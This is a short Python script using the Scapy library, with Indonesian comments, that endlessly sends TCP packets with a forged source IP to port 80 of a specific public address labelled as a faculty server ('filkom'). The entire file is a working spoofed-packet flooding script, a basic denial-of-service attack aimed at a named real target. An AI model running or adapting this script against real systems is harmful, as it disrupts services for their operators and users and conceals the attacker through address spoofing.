from scapy.all import *

kirim = True
while kirim:
    #src = alamat ip palsu/bebas filkom = 175.45.187.242
    #dst = alamat ip targat
    #dport = port yang berjalan pada target
    tcp_packet = IP(src="192.168.0.42",dst="175.45.187.242")/TCP(dport=80)
    ans = send(tcp_packet)
